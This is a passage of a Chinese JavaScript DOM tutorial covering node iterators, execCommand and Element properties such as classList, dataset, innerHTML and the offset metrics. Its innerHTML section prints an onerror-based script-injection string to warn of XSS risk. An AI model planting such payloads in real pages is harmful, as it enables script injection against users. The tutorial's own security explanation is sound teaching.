NodeFilter.SHOW_ELEMENT\n);</code></pre><p>上面代码返回<code>&lt;body&gt;</code>元素子节点的遍历器。</p>\n<p><code>document.createNodeIterator</code>方法第一个参数为所要遍历的根节点，第二个参数为所要遍历的节点类型，这里指定为元素节点（<code>NodeFilter.SHOW_ELEMENT</code>）。几种主要的节点类型写法如下。</p>\n<ul>\n<li>所有节点：NodeFilter.SHOW_ALL</li>\n<li>元素节点：NodeFilter.SHOW_ELEMENT</li>\n<li>文本节点：NodeFilter.SHOW_TEXT</li>\n<li>评论节点：NodeFilter.SHOW_COMMENT</li>\n</ul>\n<p><code>document.createNodeIterator</code>方法返回一个“遍历器”对象（<code>NodeFilter</code>实例）。该实例的<code>nextNode()</code>方法和<code>previousNode()</code>方法，可以用来遍历所有子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var nodeIterator = document.createNodeIterator(document.body);\nvar pars = [];\nvar currentNode;\n\nwhile (currentNode = nodeIterator.nextNode()) {\n  pars.push(currentNode);\n}</code></pre><p>上面代码中，使用遍历器的<code>nextNode</code>方法，将根节点的所有子节点，依次读入一个数组。<code>nextNode</code>方法先返回遍历器的内部指针所在的节点，然后会将指针移向下一个节点。所有成员遍历完成后，返回<code>null</code>。<code>previousNode</code>方法则是先将指针移向上一个节点，然后返回该节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var nodeIterator = document.createNodeIterator(\n  document.body,\n  NodeFilter.SHOW_ELEMENT\n);\n\nvar currentNode = nodeIterator.nextNode();\nvar previousNode = nodeIterator.previousNode();\n\ncurrentNode === previousNode // true</code></pre><p>上面代码中，<code>currentNode</code>和<code>previousNode</code>都指向同一个的节点。</p>\n<p>注意，遍历器返回的第一个节点，总是根节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>pars[0] === document.body // true</code></pre>\n        <h3>\n            <a href='#document.createTreeWalker()' class='header-anchor'>#</a>\n            <span>document.createTreeWalker()</span>\n        </h3>\n    <p><code>document.createTreeWalker</code>方法返回一个 DOM 的子树遍历器。它与<code>document.createNodeIterator</code>方法基本是类似的，区别在于它返回的是<code>TreeWalker</code>实例，后者返回的是<code>NodeIterator</code>实例。另外，它的第一个节点不是根节点。</p>\n<p><code>document.createTreeWalker</code>方法的第一个参数是所要遍历的根节点，第二个参数指定所要遍历的节点类型（与<code>document.createNodeIterator</code>方法的第二个参数相同）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var treeWalker = document.createTreeWalker(\n  document.body,\n  NodeFilter.SHOW_ELEMENT\n);\n\nvar nodeList = [];\n\nwhile(treeWalker.nextNode()) {\n  nodeList.push(treeWalker.currentNode);\n}</code></pre><p>上面代码遍历<code>&lt;body&gt;</code>节点下属的所有元素节点，将它们插入<code>nodeList</code>数组。</p>\n\n        <h3>\n            <a href='#document.execCommand()，document.queryCommandSupported()，document.queryCommandEnabled()' class='header-anchor'>#</a>\n            <span>document.execCommand()，document.queryCommandSupported()，document.queryCommandEnabled()</span>\n        </h3>\n    <p>如果<code>document.designMode</code>属性设为<code>on</code>，那么整个文档用户可编辑；如果元素的<code>contenteditable</code>属性设为<code>true</code>，那么该元素可编辑。这两种情况下，可以使用<code>document.execCommand()</code>方法，改变内容的样式，比如<code>document.execCommand(&#39;bold&#39;)</code>会使得字体加粗。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.execCommand(command, showDefaultUI, input)</code></pre><p>该方法接受三个参数。</p>\n<ul>\n<li><code>command</code>：字符串，表示所要实施的样式。</li>\n<li><code>showDefaultUI</code>：布尔值，表示是否要使用默认的用户界面，建议总是设为<code>false</code>。</li>\n<li><code>input</code>：字符串，表示该样式的辅助内容，比如生成超级链接时，这个参数就是所要链接的网址。如果第二个参数设为<code>true</code>，那么浏览器会弹出提示框，要求用户在提示框输入该参数。但是，不是所有浏览器都支持这样做，为了兼容性，还是需要自己部署获取这个参数的方式。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var url = window.prompt(&#039;请输入网址&#039;);\n\nif (url) {\n  document.execCommand(&#039;createlink&#039;, false, url);\n}</code></pre><p>上面代码中，先提示用户输入所要链接的网址，然后手动生成超级链接。注意，第二个参数是<code>false</code>，表示此时不需要自动弹出提示框。</p>\n<p><code>document.execCommand()</code>的返回值是一个布尔值。如果为<code>false</code>，表示这个方法无法生效。</p>\n<p>这个方法大部分情况下，只对选中的内容生效。如果有多个内容可编辑区域，那么只对当前焦点所在的元素生效。</p>\n<p><code>document.execCommand()</code>方法可以执行的样式改变有很多种，下面是其中的一些：bold、insertLineBreak、selectAll、createLink、insertOrderedList、subscript、delete、insertUnorderedList、superscript、formatBlock、insertParagraph、undo、forwardDelete、insertText、unlink、insertImage、italic、unselect、insertHTML、redo。这些值都可以用作第一个参数，它们的含义不难从字面上看出来。</p>\n<p><code>document.queryCommandEnabled()</code>方法返回一个布尔值，表示浏览器是否允许使用这个方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (document.queryCommandEnabled(&#039;SelectAll&#039;)) {\n  // ...\n}</code></pre><p><code>document.queryCommandSupported()</code>方法返回一个布尔值，表示当前是否可用某种样式改变。比如，加粗只有存在文本选中时才可用，如果没有选中文本，就不可用。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (document.queryCommandSupported(&#039;SelectAll&#039;)) {\n  // ...\n}</code></pre><p><code>document.queryCommandEnabled()</code>方法返回一个布尔值，</p>\n\n        <h3>\n            <a href='#document.getSelection()' class='header-anchor'>#</a>\n            <span>document.getSelection()</span>\n        </h3>\n    <p>这个方法指向<code>window.getSelection()</code>，参见<code>window</code>对象一节的介绍。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"Element 节点","link":"/dom/element.html"}],"content":"\n        <h1>\n            <a href='#Element-节点' class='header-anchor'>#</a>\n            <span>Element 节点</span>\n        </h1>\n    <p><code>Element</code>节点对象对应网页的 HTML 元素。每一个 HTML 元素，在 DOM 树上都会转化成一个<code>Element</code>节点对象（以下简称元素节点）。</p>\n<p>元素节点的<code>nodeType</code>属性都是<code>1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = document.querySelector(&#039;p&#039;);\np.nodeName // &quot;P&quot;\np.nodeType // 1</code></pre><p><code>Element</code>对象继承了<code>Node</code>接口，因此<code>Node</code>的属性和方法在<code>Element</code>对象都存在。此外，不同的 HTML 元素对应的元素节点是不一样的，浏览器使用不同的构造函数，生成不同的元素节点，比如<code>&lt;a&gt;</code>元素的节点对象由<code>HTMLAnchorElement</code>构造函数生成，<code>&lt;button&gt;</code>元素的节点对象由<code>HTMLButtonElement</code>构造函数生成。因此，元素节点不是一种对象，而是一组对象，这些对象除了继承<code>Element</code>的属性和方法，还有各自构造函数的属性和方法。</p>\n\n        <h2>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#元素特性的相关属性' class='header-anchor'>#</a>\n            <span>元素特性的相关属性</span>\n        </h3>\n    <p><strong>（1）Element.id</strong></p>\n<p><code>Element.id</code>属性返回指定元素的<code>id</code>属性，该属性可读写。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为 &lt;p id=&quot;foo&quot;&gt;\nvar p = document.querySelector(&#039;p&#039;);\np.id // &quot;foo&quot;</code></pre><p>注意，<code>id</code>属性的值是大小写敏感，即浏览器能正确识别<code>&lt;p id=&quot;foo&quot;&gt;</code>和<code>&lt;p id=&quot;FOO&quot;&gt;</code>这两个元素的<code>id</code>属性，但是最好不要这样命名。</p>\n<p><strong>（2）Element.tagName</strong></p>\n<p><code>Element.tagName</code>属性返回指定元素的大写标签名，与<code>nodeName</code>属性的值相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML代码为\n// &lt;span id=&quot;myspan&quot;&gt;Hello&lt;/span&gt;\nvar span = document.getElementById(&#039;myspan&#039;);\nspan.id // &quot;myspan&quot;\nspan.tagName // &quot;SPAN&quot;</code></pre><p><strong>（3）Element.dir</strong></p>\n<p><code>Element.dir</code>属性用于读写当前元素的文字方向，可能是从左到右（<code>&quot;ltr&quot;</code>），也可能是从右到左（<code>&quot;rtl&quot;</code>）。</p>\n<p><strong>（4）Element.accessKey</strong></p>\n<p><code>Element.accessKey</code>属性用于读写分配给当前元素的快捷键。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;button accesskey=&quot;h&quot; id=&quot;btn&quot;&gt;点击&lt;/button&gt;\nvar btn = document.getElementById(&#039;btn&#039;);\nbtn.accessKey // &quot;h&quot;</code></pre><p>上面代码中，<code>btn</code>元素的快捷键是<code>h</code>，按下<code>Alt + h</code>就能将焦点转移到它上面。</p>\n<p><strong>（5）Element.draggable</strong></p>\n<p><code>Element.draggable</code>属性返回一个布尔值，表示当前元素是否可拖动。该属性可读写。</p>\n<p><strong>（6）Element.lang</strong></p>\n<p><code>Element.lang</code>属性返回当前元素的语言设置。该属性可读写。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;html lang=&quot;en&quot;&gt;\ndocument.documentElement.lang // &quot;en&quot;</code></pre><p><strong>（7）Element.tabIndex</strong></p>\n<p><code>Element.tabIndex</code>属性返回一个整数，表示当前元素在 Tab 键遍历时的顺序。该属性可读写。</p>\n<p><code>tabIndex</code>属性值如果是负值（通常是<code>-1</code>），则 Tab 键不会遍历到该元素。如果是正整数，则按照顺序，从小到大遍历。如果两个元素的<code>tabIndex</code>属性的正整数值相同，则按照出现的顺序遍历。遍历完所有<code>tabIndex</code>为正整数的元素以后，再遍历所有<code>tabIndex</code>等于<code>0</code>、或者属性值是非法值、或者没有<code>tabIndex</code>属性的元素，顺序为它们在网页中出现的顺序。</p>\n<p><strong>（8）Element.title</strong></p>\n<p><code>Element.title</code>属性用来读写当前元素的 HTML 属性<code>title</code>。该属性通常用来指定，鼠标悬浮时弹出的文字提示框。</p>\n\n        <h3>\n            <a href='#元素状态的相关属性' class='header-anchor'>#</a>\n            <span>元素状态的相关属性</span>\n        </h3>\n    <p><strong>（1）Element.hidden</strong></p>\n<p><code>Element.hidden</code>属性返回一个布尔值，表示当前元素的<code>hidden</code>属性，用来控制当前元素是否可见。该属性可读写。</p>\n<pre class=\"prettyprint language-javascript\"><code>var btn = document.getElementById(&#039;btn&#039;);\nvar mydiv = document.getElementById(&#039;mydiv&#039;);\n\nbtn.addEventListener(&#039;click&#039;, function () {\n  mydiv.hidden = !mydiv.hidden;\n}, false);</code></pre><p>注意，该属性与 CSS 设置是互相独立的。CSS 对这个元素可见性的设置，<code>Element.hidden</code>并不能反映出来。也就是说，这个属性并不能用来判断当前元素的实际可见性。</p>\n<p>CSS 的设置高于<code>Element.hidden</code>。如果 CSS 指定了该元素不可见（<code>display: none</code>）或可见（<code>display: hidden</code>），那么<code>Element.hidden</code>并不能改变该元素实际的可见性。换言之，这个属性只在 CSS 没有明确设定当前元素的可见性时才有效。</p>\n<p><strong>（2）Element.contentEditable，Element.isContentEditable</strong></p>\n<p>HTML 元素可以设置<code>contentEditable</code>属性，使得元素的内容可以编辑。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div contenteditable&gt;123&lt;/div&gt;</code></pre><p>上面代码中，<code>&lt;div&gt;</code>元素有<code>contenteditable</code>属性，因此用户可以在网页上编辑这个区块的内容。</p>\n<p><code>Element.contentEditable</code>属性返回一个字符串，表示是否设置了<code>contenteditable</code>属性，有三种可能的值。该属性可写。</p>\n<ul>\n<li><code>&quot;true&quot;</code>：元素内容可编辑</li>\n<li><code>&quot;false&quot;</code>：元素内容不可编辑</li>\n<li><code>&quot;inherit&quot;</code>：元素是否可编辑，继承了父元素的设置</li>\n</ul>\n<p><code>Element.isContentEditable</code>属性返回一个布尔值，同样表示是否设置了<code>contenteditable</code>属性。该属性只读。</p>\n\n        <h3>\n            <a href='#Element.attributes' class='header-anchor'>#</a>\n            <span>Element.attributes</span>\n        </h3>\n    <p><code>Element.attributes</code>属性返回一个类似数组的对象，成员是当前元素节点的所有属性节点，详见《属性的操作》一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = document.querySelector(&#039;p&#039;);\nvar attrs = p.attributes;\n\nfor (var i = attrs.length - 1; i &gt;= 0; i--) {\n  console.log(attrs[i].name + &#039;-&gt;&#039; + attrs[i].value);\n}</code></pre><p>上面代码遍历<code>p</code>元素的所有属性。</p>\n\n        <h3>\n            <a href='#Element.className，Element.classList' class='header-anchor'>#</a>\n            <span>Element.className，Element.classList</span>\n        </h3>\n    <p><code>className</code>属性用来读写当前元素节点的<code>class</code>属性。它的值是一个字符串，每个<code>class</code>之间用空格分割。</p>\n<p><code>classList</code>属性返回一个类似数组的对象，当前元素节点的每个<code>class</code>就是这个对象的一个成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码 &lt;div class=&quot;one two three&quot; id=&quot;myDiv&quot;&gt;&lt;/div&gt;\nvar div = document.getElementById(&#039;myDiv&#039;);\n\ndiv.className\n// &quot;one two three&quot;\n\ndiv.classList\n// {\n//   0: &quot;one&quot;\n//   1: &quot;two&quot;\n//   2: &quot;three&quot;\n//   length: 3\n// }</code></pre><p>上面代码中，<code>className</code>属性返回一个空格分隔的字符串，而<code>classList</code>属性指向一个类似数组的对象，该对象的<code>length</code>属性（只读）返回当前元素的<code>class</code>数量。</p>\n<p><code>classList</code>对象有下列方法。</p>\n<ul>\n<li><code>add()</code>：增加一个 class。</li>\n<li><code>remove()</code>：移除一个 class。</li>\n<li><code>contains()</code>：检查当前元素是否包含某个 class。</li>\n<li><code>toggle()</code>：将某个 class 移入或移出当前元素。</li>\n<li><code>item()</code>：返回指定索引位置的 class。</li>\n<li><code>toString()</code>：将 class 的列表转为字符串。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var div = document.getElementById(&#039;myDiv&#039;);\n\ndiv.classList.add(&#039;myCssClass&#039;);\ndiv.classList.add(&#039;foo&#039;, &#039;bar&#039;);\ndiv.classList.remove(&#039;myCssClass&#039;);\ndiv.classList.toggle(&#039;myCssClass&#039;); // 如果 myCssClass 不存在就加入，否则移除\ndiv.classList.contains(&#039;myCssClass&#039;); // 返回 true 或者 false\ndiv.classList.item(0); // 返回第一个 Class\ndiv.classList.toString();</code></pre><p>下面比较一下，<code>className</code>和<code>classList</code>在添加和删除某个 class 时的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = document.getElementById(&#039;foo&#039;);\n\n// 添加class\nfoo.className += &#039;bold&#039;;\nfoo.classList.add(&#039;bold&#039;);\n\n// 删除class\nfoo.classList.remove(&#039;bold&#039;);\nfoo.className = foo.className.replace(/^bold$/, &#039;&#039;);</code></pre><p><code>toggle</code>方法可以接受一个布尔值，作为第二个参数。如果为<code>true</code>，则添加该属性；如果为<code>false</code>，则去除该属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>el.classList.toggle(&#039;abc&#039;, boolValue);\n\n// 等同于\nif (boolValue) {\n  el.classList.add(&#039;abc&#039;);\n} else {\n  el.classList.remove(&#039;abc&#039;);\n}</code></pre>\n        <h3>\n            <a href='#Element.dataset' class='header-anchor'>#</a>\n            <span>Element.dataset</span>\n        </h3>\n    <p>网页元素可以自定义<code>data-</code>属性，用来添加数据。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div data-timestamp=&quot;1522907809292&quot;&gt;&lt;/div&gt;</code></pre><p>上面代码中，<code>&lt;div&gt;</code>元素有一个自定义的<code>data-timestamp</code>属性，用来为该元素添加一个时间戳。</p>\n<p><code>Element.dataset</code>属性返回一个对象，可以从这个对象读写<code>data-</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>// &lt;article\n//   id=&quot;foo&quot;\n//   data-columns=&quot;3&quot;\n//   data-index-number=&quot;12314&quot;\n//   data-parent=&quot;cars&quot;&gt;\n//   ...\n// &lt;/article&gt;\nvar article = document.getElementById(&#039;foo&#039;);\nfoo.dataset.columns // &quot;3&quot;\nfoo.dataset.indexNumber // &quot;12314&quot;\nfoo.dataset.parent // &quot;cars&quot;</code></pre><p>注意，<code>dataset</code>上面的各个属性返回都是字符串。</p>\n<p>HTML 代码中，<code>data-</code>属性的属性名，只能包含英文字母、数字、连词线（<code>-</code>）、点（<code>.</code>）、冒号（<code>:</code>）和下划线（<code>_</code>）。它们转成 JavaScript 对应的<code>dataset</code>属性名，规则如下。</p>\n<ul>\n<li>开头的<code>data-</code>会省略。</li>\n<li>如果连词线后面跟了一个英文字母，那么连词线会取消，该字母变成大写。</li>\n<li>其他字符不变。</li>\n</ul>\n<p>因此，<code>data-abc-def</code>对应<code>dataset.abcDef</code>，<code>data-abc-1</code>对应<code>dataset[&quot;abc-1&quot;]</code>。</p>\n<p>除了使用<code>dataset</code>读写<code>data-</code>属性，也可以使用<code>Element.getAttribute()</code>和<code>Element.setAttribute()</code>，通过完整的属性名读写这些属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var mydiv = document.getElementById(&#039;mydiv&#039;);\n\nmydiv.dataset.foo = &#039;bar&#039;;\nmydiv.getAttribute(&#039;data-foo&#039;) // &quot;bar&quot;</code></pre>\n        <h3>\n            <a href='#Element.innerHTML' class='header-anchor'>#</a>\n            <span>Element.innerHTML</span>\n        </h3>\n    <p><code>Element.innerHTML</code>属性返回一个字符串，等同于该元素包含的所有 HTML 代码。该属性可读写，常用来设置某个节点的内容。它能改写所有元素节点的内容，包括<code>&lt;HTML&gt;</code>和<code>&lt;body&gt;</code>元素。</p>\n<p>如果将<code>innerHTML</code>属性设为空，等于删除所有它包含的所有节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>el.innerHTML = &#039;&#039;;</code></pre><p>上面代码等于将<code>el</code>节点变成了一个空节点，<code>el</code>原来包含的节点被全部删除。</p>\n<p>注意，读取属性值的时候，如果文本节点包含<code>&amp;</code>、小于号（<code>&lt;</code>）和大于号（<code>&gt;</code>），<code>innerHTML</code>属性会将它们转为实体形式<code>&amp;amp;</code>、<code>&amp;lt;</code>、<code>&amp;gt;</code>。如果想得到原文，建议使用<code>element.textContent</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML代码如下 &lt;p id=&quot;para&quot;&gt; 5 &gt; 3 &lt;/p&gt;\ndocument.getElementById(&#039;para&#039;).innerHTML\n// 5 &amp;gt; 3</code></pre><p>写入的时候，如果插入的文本包含 HTML 标签，会被解析成为节点对象插入 DOM。注意，如果文本之中含有<code>&lt;script&gt;</code>标签，虽然可以生成<code>script</code>节点，但是插入的代码不会执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var name = &quot;&lt;script&gt;alert(&#039;haha&#039;)&lt;/script&gt;&quot;;\nel.innerHTML = name;</code></pre><p>上面代码将脚本插入内容，脚本并不会执行。但是，<code>innerHTML</code>还是有安全风险的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var name = &quot;&lt;img src=x onerror=alert(1)&gt;&quot;;\nel.innerHTML = name;</code></pre><p>上面代码中，<code>alert</code>方法是会执行的。因此为了安全考虑，如果插入的是文本，最好用<code>textContent</code>属性代替<code>innerHTML</code>。</p>\n\n        <h3>\n            <a href='#Element.outerHTML' class='header-anchor'>#</a>\n            <span>Element.outerHTML</span>\n        </h3>\n    <p><code>Element.outerHTML</code>属性返回一个字符串，表示当前元素节点的所有 HTML 代码，包括该元素本身和所有子元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;d&quot;&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;\nvar d = document.getElementById(&#039;d&#039;);\nd.outerHTML\n// &#039;&lt;div id=&quot;d&quot;&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;&#039;</code></pre><p><code>outerHTML</code>属性是可读写的，对它进行赋值，等于替换掉当前元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;container&quot;&gt;&lt;div id=&quot;d&quot;&gt;Hello&lt;/div&gt;&lt;/div&gt;\nvar container = document.getElementById(&#039;container&#039;);\nvar d = document.getElementById(&#039;d&#039;);\ncontainer.firstChild.nodeName // &quot;DIV&quot;\nd.nodeName // &quot;DIV&quot;\n\nd.outerHTML = &#039;&lt;p&gt;Hello&lt;/p&gt;&#039;;\ncontainer.firstChild.nodeName // &quot;P&quot;\nd.nodeName // &quot;DIV&quot;</code></pre><p>上面代码中，变量<code>d</code>代表子节点，它的<code>outerHTML</code>属性重新赋值以后，内层的<code>div</code>元素就不存在了，被<code>p</code>元素替换了。但是，变量<code>d</code>依然指向原来的<code>div</code>元素，这表示被替换的<code>DIV</code>元素还存在于内存中。</p>\n<p>注意，如果一个节点没有父节点，设置<code>outerHTML</code>属性会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var div = document.createElement(&#039;div&#039;);\ndiv.outerHTML = &#039;&lt;p&gt;test&lt;/p&gt;&#039;;\n// DOMException: This element has no parent node.</code></pre><p>上面代码中，<code>div</code>元素没有父节点，设置<code>outerHTML</code>属性会报错。</p>\n\n        <h3>\n            <a href='#Element.clientHeight，Element.clientWidth' class='header-anchor'>#</a>\n            <span>Element.clientHeight，Element.clientWidth</span>\n        </h3>\n    <p><code>Element.clientHeight</code>属性返回一个整数值，表示元素节点的 CSS 高度（单位像素），只对块级元素生效，对于行内元素返回<code>0</code>。如果块级元素没有设置 CSS 高度，则返回实际高度。</p>\n<p>除了元素本身的高度，它还包括<code>padding</code>部分，但是不包括<code>border</code>、<code>margin</code>。如果有水平滚动条，还要减去水平滚动条的高度。注意，这个值始终是整数，如果是小数会被四舍五入。</p>\n<p><code>Element.clientWidth</code>属性返回元素节点的 CSS 宽度，同样只对块级元素有效，也是只包括元素本身的宽度和<code>padding</code>，如果有垂直滚动条，还要减去垂直滚动条的宽度。</p>\n<p><code>document.documentElement</code>的<code>clientHeight</code>属性，返回当前视口的高度（即浏览器窗口的高度），等同于<code>window.innerHeight</code>属性减去水平滚动条的高度（如果有的话）。<code>document.body</code>的高度则是网页的实际高度。一般来说，<code>document.body.clientHeight</code>大于<code>document.documentElement.clientHeight</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 视口高度\ndocument.documentElement.clientHeight\n\n// 网页总高度\ndocument.body.clientHeight</code></pre>\n        <h3>\n            <a href='#Element.clientLeft，Element.clientTop' class='header-anchor'>#</a>\n            <span>Element.clientLeft，Element.clientTop</span>\n        </h3>\n    <p><code>Element.clientLeft</code>属性等于元素节点左边框（left border）的宽度（单位像素），不包括左侧的<code>padding</code>和<code>margin</code>。如果没有设置左边框，或者是行内元素（<code>display: inline</code>），该属性返回<code>0</code>。该属性总是返回整数值，如果是小数，会四舍五入。</p>\n<p><code>Element.clientTop</code>属性等于网页元素顶部边框的宽度（单位像素），其他特点都与<code>clientLeft</code>相同。</p>\n\n        <h3>\n            <a href='#Element.scrollHeight，Element.scrollWidth' class='header-anchor'>#</a>\n            <span>Element.scrollHeight，Element.scrollWidth</span>\n        </h3>\n    <p><code>Element.scrollHeight</code>属性返回一个整数值（小数会四舍五入），表示当前元素的总高度（单位像素），包括溢出容器、当前不可见的部分。它包括<code>padding</code>，但是不包括<code>border</code>、<code>margin</code>以及水平滚动条的高度（如果有水平滚动条的话），还包括伪元素（<code>::before</code>或<code>::after</code>）的高度。</p>\n<p><code>Element.scrollWidth</code>属性表示当前元素的总宽度（单位像素），其他地方都与<code>scrollHeight</code>属性类似。这两个属性只读。</p>\n<p>整张网页的总高度可以从<code>document.documentElement</code>或<code>document.body</code>上读取。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 返回网页的总高度\ndocument.documentElement.scrollHeight\ndocument.body.scrollHeight</code></pre><p>注意，如果元素节点的内容出现溢出，即使溢出的内容是隐藏的，<code>scrollHeight</code>属性仍然返回元素的总高度。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;myDiv&quot; style=&quot;height: 200px; overflow: hidden;&quot;&gt;...&lt;div&gt;\ndocument.getElementById(&#039;myDiv&#039;).scrollHeight // 356</code></pre><p>上面代码中，即使<code>myDiv</code>元素的 CSS 高度只有200像素，且溢出部分不可见，但是<code>scrollHeight</code>仍然会返回该元素的原始高度。</p>\n\n        <h3>\n            <a href='#Element.scrollLeft，Element.scrollTop' class='header-anchor'>#</a>\n            <span>Element.scrollLeft，Element.scrollTop</span>\n        </h3>\n    <p><code>Element.scrollLeft</code>属性表示当前元素的水平滚动条向右侧滚动的像素数量，<code>Element.scrollTop</code>属性表示当前元素的垂直滚动条向下滚动的像素数量。对于那些没有滚动条的网页元素，这两个属性总是等于0。</p>\n<p>如果要查看整张网页的水平的和垂直的滚动距离，要从<code>document.documentElement</code>元素上读取。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.documentElement.scrollLeft\ndocument.documentElement.scrollTop</code></pre><p>这两个属性都可读写，设置该属性的值，会导致浏览器将当前元素自动滚动到相应的位置。</p>\n\n        <h3>\n            <a href='#Element.offsetParent' class='header-anchor'>#</a>\n            <span>Element.offsetParent</span>\n        </h3>\n    <p><code>Element.offsetParent</code>属性返回最靠近当前元素的、并且 CSS 的<code>position</code>属性不等于<code>static</code>的上层元素。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div style=&quot;position: absolute;&quot;&gt;\n  &lt;p&gt;\n    &lt;span&gt;Hello&lt;/span&gt;\n  &lt;/p&gt;\n&lt;/div&gt;</code></pre><p>上面代码中，<code>span</code>元素的<code>offsetParent</code>属性就是<code>div</code>元素。</p>\n<p>该属性主要用于确定子元素位置偏移的计算基准，<code>Element.offsetTop</code>和<code>Element.offsetLeft</code>就是<code>offsetParent</code>元素计算的。</p>\n<p>如果该元素是不可见的（<code>display</code>属性为<code>none</code>），或者位置是固定的（<code>position</code>属性为<code>fixed</code>），则<code>offsetParent</code>属性返回<code>null</code>。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div style=&quot;position: absolute;&quot;&gt;\n  &lt;p&gt;\n    &lt;span style=&quot;display: none;&quot;&gt;Hello&lt;/span&gt;\n  &lt;/p&gt;\n&lt;/div&gt;</code></pre><p>上面代码中，<code>span</code>元素的<code>offsetParent</code>属性是<code>null</code>。</p>\n<p>如果某个元素的所有上层节点的<code>position</code>属性都是<code>static</code>，则<code>Element.offsetParent</code>属性指向<code>&lt;body&gt;</code>元素。</p>\n\n        <h3>\n            <a href='#Element.offsetHeight，Element.offsetWidth' class='header-anchor'>#</a>\n            <span>Element.offsetHeight，Element.offsetWidth</span>\n        </h3>\n    <p><code>Element.offsetHeight</code>属性返回一个整数，表示元素的 CSS 垂直高度（单位像素），包括元素本身的高度、padding 和 border，以及水平滚动条的高度（如果存在滚动条）。</p>\n<p><code>Element.offsetWidth</code>属性表示元素的 CSS 水平宽度（单位像素），其他都与<code>Element.offsetHeight</code>一致。</p>\n<p>这两个属性都是只读属性，只比<code>Element.clientHeight</code>和<code>Element.clientWidth</code>多了边框的高度或宽度。如果元素的 CSS 设为不可见（比如<code>display: none;</code>），则返回<code>0</code>。</p>\n\n        <h3>\n            <a href='#Element.offsetLeft，Element.offsetTop' class='header-anchor'>#</a>\n            <span>Element.offsetLeft，Element.offsetTop</span>\n        </h3>\n    <p><code>Element.offsetLeft</code>返回当前元素左上角相对于<code>Element.offsetParent</code>节点的水平位移，<code>Element.offsetTop</code>返回垂直位移，单位为像素。通常，这两个值是指相对于父节点的位移。</p>\n<p>下面的代码可以算出元素左上角相对于整张网页的坐标。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getElementPosition(e) {\n  var x = 0;\n  var y = 0;\n  while (e !== null)  {\n    x += e.offsetLeft;\n    y += e.offsetTop;\n    e = e.offsetParent;\n  }\n  return {x: x, y: y};\n}</code></pre>\n        <h3>\n            <a href='#Element.style' class='header-anchor'>#</a>\n            <span>Element.style</span>\n        </h3>\n    <p>每个元素节点都有<code>style</code>用来读写该元素的行内样式信息，具体介绍参见《CSS 操作》一章。</p>\n\n        <h3>\n            <a href='#Element.children，Element.childElementCount' class='header-anchor'>#</a>\n            <span>Element.children，Element.childElementCount</span>\n        </h3>\n    <p><code>Element.children</code>属性返回一个类似数组的对象（<code>HTMLCollection</code>实例），包括当前元素节点的所有子元素。如果当前元素没有子元素，则返回的对象包含零个成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (para.children.length) {\n  var children = para.children;\n    for (var i = 0; i &lt; children.length; i++) {\n      // ...\n    }\n}</code></pre><p>上面代码遍历了<code>para</code>元素的所有子元素。</p>\n<p>这个属性与<code>Node.childNodes</code>属性的区别是，它只包括元素类型的子节点，不包括其他类型的子节点。</p>\n<p><code>Element.childElementCount</code>属性返回当前元素节点包含的子元素节点的个数，与<code>Element.children.length</code>的值相同。</p>\n\n        <h3>\n            <a href='#Element.firstElementChild，Element.lastElementChild' class='header-anchor'>#</a>\n            <span>Element.firstElementChild，Element.lastElementChild</span>\n        </h3>\n    <p><code>Element.firstElementChild</code>属性返回当前元素的第一个元素子节点，<code>Element.lastElementChild</code>返回最后一个元素子节点。</p>\n<p>如果没有元素子节点，这两个属性返回<code>null</code>。</p>\n\n        <h3>\n            <a href='#Element.nextElementSibling，Element.previousElementSibling' class='header-anchor'>#</a>\n            <span>Element.nextElementSibling，Element.previousElementSibling</span>\n        </h3>\n    <p><code>Element.nextElementSibling</code>属性返回当前元素节点的后一个同级元素节点，如果没有则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;div-01&quot;&gt;Here is div-01&lt;/div&gt;\n// &lt;div id=&quot;div-02&quot;&gt;Here is div-02&lt;/div&gt;\nvar el = document.getElementById(&#039;div-01&#039;);\nel.nextElementSibling\n// &lt;div 